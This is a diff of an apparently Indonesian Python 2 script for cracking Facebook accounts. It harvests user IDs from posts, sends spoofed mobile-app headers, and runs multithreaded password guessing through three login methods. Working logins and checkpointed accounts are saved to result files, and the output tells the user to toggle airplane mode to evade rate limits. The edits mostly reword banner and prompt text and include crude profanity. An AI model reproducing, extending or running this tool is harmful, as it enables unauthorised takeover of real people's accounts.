@@ -61,7 +61,7 @@ def folder():
 IP = requests.get("https://api.ipify.org/").text
 def banner():
 	print (''' %s 
- © [ YNTKTS] Yo Ndak Tau Kok Tanya Saia%s \n __________       _____.__  \n \____    /____ _/ ____\__| %s|| %sZona \n   /     /\\__  \\\   __\|  | %s|| %sAkun \n  /     /_ / __ \|  |  |  | %s||%s Facebook [Meta] \n /_______ (____  /__|  |__| %s||%s Indonesia \n         \/    \/ \n %s[%s•%s] Created by : %sAang Ardiansyah-XD \n %s[%s•%s] -------------------------------------- \n [%s•%s] IP Kamu  : %s%s'''%
+ © (YNTKTS) Yo Ndak Tau Kok Tanya Saia:v%s \n __________       _____.__  \n \____    /____ _/ ____\__| %s|| %sZona \n   /     /\\__  \\\   __\|  | %s|| %sAkun \n  /     /_ / __ \|  |  |  | %s||%s Facebook [Meta] \n /_______ (____  /__|  |__| %s||%s Indonesia \n         \/    \/ \n %s[%s•%s] Created by : %sAang Ardiansyah-XD \n %s[%s•%s] -------------------------------------- \n [%s•%s] IP Kamu  : %s%s'''%
  (H,K,H,K,H,K,H,K,H,K,P,K,P,H,P,K,P,K,P,H,IP))
 # MASUK TOKEN (TOKEN LISTRIK)
 header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]", "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
@@ -176,7 +176,7 @@ def postingan(romz,headers=header):
         for a in z['data']:
             id.append(a['id'] + '<=>' + a['name'])
             bff.write(a['id'] + '<=>' + a['name'] + '\n')
-            print '\r%s [*] mengumpulkan id :%s %s ' % (P,H,str(len(id))),
+            print '\r%s [*] sabar kentod, sedang mengumpulkan id :%s %s ' % (P,H,str(len(id))),
             sys.stdout.flush();jeda(0.0050)
         bff.close()
         print ('\n\n %s[%s√%s] Succes dump id postingan '%(P,H,P))
@@ -200,7 +200,7 @@ class ngentod:
             raw_input('\n%s [ %senter %s] '%(P,K,P));menu()
         unikers = raw_input('%s [?] ingin gunakan password manual? [y/t] :%s '%(P,K))
         if unikers in ('Y', 'y'):
-            print '\n %s[%s!%s] cth : %ssayang,anjing%s gunakan , (koma) untuk pemisah '%(P,M,P,H,P)
+            print '\n %s[%s!%s] cth : %ssayang,anjing,kontol%s gunakan , (koma) untuk pemisah '%(P,M,P,H,P)
             while True:
                 pwx = raw_input(' %s[?] set password :%s '%(P,K))
                 if pwx == '':
@@ -215,7 +215,7 @@ class ngentod:
                         elif ind in ('1', '01'):
                             print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                             print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
-                            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
+                            print '%s [%s!%s] Jika tidak ada hasil, gunakan mode pesawat [3 detik]\n'%(P,M,P);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -226,7 +226,7 @@ class ngentod:
                         elif ind in ('2', '02'):
                             print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                             print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
-                            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
+                            print '%s [%s!%s] Jika tidak ada hasil, gunakan mode pesawat [3 detik]\n'%(P,M,P);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -237,7 +237,7 @@ class ngentod:
                         elif ind in ('3', '03'):
                             print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
                             print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
-                            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
+                            print '%s [%s!%s] Jika tidak ada hasil, gunakan mode pesawat [3 detik]\n'%(P,M,P);jeda(0.2)
                             with ThreadPoolExecutor(max_workers=30) as log:
                                 for akun in self.id:
                                     try:
@@ -247,17 +247,17 @@ class ngentod:
                             os.remove(self.apk);exit()
                         else:
                             print ('\n %s[!] isi yang benar kentod'%(M));zona()
-                    print '\n%s [ pilih methode crack - silahkan coba satu² ]\n'%(P)
-                    print ' [%s01%s] methode b-api (crack cepat)'%(K,P)
-                    print ' [%s02%s] methode mbasic (crack lambat)'%(K,P)
-                    print ' [%s03%s] methode mobile (crack sangat lambat) '%(K,P)
+                    print '\n%s [ pilih metode crack - silahkan coba satu² ]\n'%(P)
+                    print ' [%s01%s] metode b-api (cepat)'%(K,P)
+                    print ' [%s02%s] metode mbasic (lambat)'%(K,P)
+                    print ' [%s03%s] metode mobile (sangat lambat) '%(K,P)
                     zona(pwx.split(','))
                     break
         elif unikers in ('T', 't'):
-            print '\n%s [ pilih methode crack - silahkan coba satu² ]\n'%(P)
-            print ' [%s01%s] methode b-api (crack cepat)'%(K,P)
-            print ' [%s02%s] methode mbasic (crack lambat)'%(K,P)
-            print ' [%s03%s] methode mobile (crack sangat lambat) '%(K,P)
+            print '\n%s [ pilih metode crack - silahkan coba satu² ]\n'%(P)
+            print ' [%s01%s] metode b-api (cepat)'%(K,P)
+            print ' [%s02%s] metode mbasic (lambat)'%(K,P)
+            print ' [%s03%s] metode mobile (sangat lambat) '%(K,P)
             self.langsung()
         else:
             print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
@@ -268,7 +268,7 @@ class ngentod:
         elif suuu in ('1', '01'):
             print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
             print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
-            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
+            print '%s [%s!%s] Jika tidak ada hasil, gunakan mode pesawat [3 detik]\n'%(P,M,P);jeda(0.2)
             with ThreadPoolExecutor(max_workers=30) as log:
             	for akun in self.id: 
                     try:
@@ -284,7 +284,7 @@ class ngentod:
         elif suuu in ('2', '02'):
             print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
             print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
-            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
+            print '%s [%s!%s] Jika tidak ada hasil, gunakan mode pesawat [3 detik]\n'%(P,M,P);jeda(0.2)
             with ThreadPoolExecutor(max_workers=30) as log:
             	for akun in self.id: 
                     try:
@@ -300,7 +300,7 @@ class ngentod:
         elif suuu in ('3', '03'):
             print '\n %s[%s*%s] akun %sOK%s tersimpan di >%s hasil/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
             print '%s [%s*%s] akun %sCP %stersimpan di > %shasil/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
-            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
+            print '%s [%s!%s] Jika tidak ada hasil, gunakan mode pesawat [3 detik]\n'%(P,M,P);jeda(0.2)
             with ThreadPoolExecutor(max_workers=30) as log:
             	for akun in self.id: 
                     try:
